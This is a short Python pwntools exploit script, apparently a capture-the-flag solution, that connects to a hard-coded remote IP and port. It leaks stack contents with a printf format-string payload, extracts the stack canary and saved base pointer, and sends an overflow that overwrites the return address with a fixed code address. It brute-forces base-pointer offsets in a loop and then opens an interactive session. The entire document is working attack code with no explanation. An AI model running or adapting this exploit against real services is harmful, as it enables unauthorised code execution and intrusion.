from pwn import *

proc = remote("109.233.56.90", 11608)
proc.recvuntil("printf string:")
proc.sendline(b"%p"*((0x50-8)//2 - 1))
stack = proc.recvuntil("printf string:")
#print(stack)
for i in range(10000000, 1000000000000, 72):
    canary = p64(int(str(stack[0xD0-6:0xD8+2])[2:-1], 16))
    rbp = p64(int(str(stack[0xd8+4:0xd8+16])[2:-1], 16) + i)
    rip = p64(0x00401182)
    proc.sendline(b"%c"*((0x50-8)//2) + canary + rbp + rip)
    s = proc.recvuntil(b"printf string:")
    print(s)
    proc.sendline(b"q")
proc.send(b"%c"*((0x50-8)//2) + canary + rbp + rip)
proc.interactive()
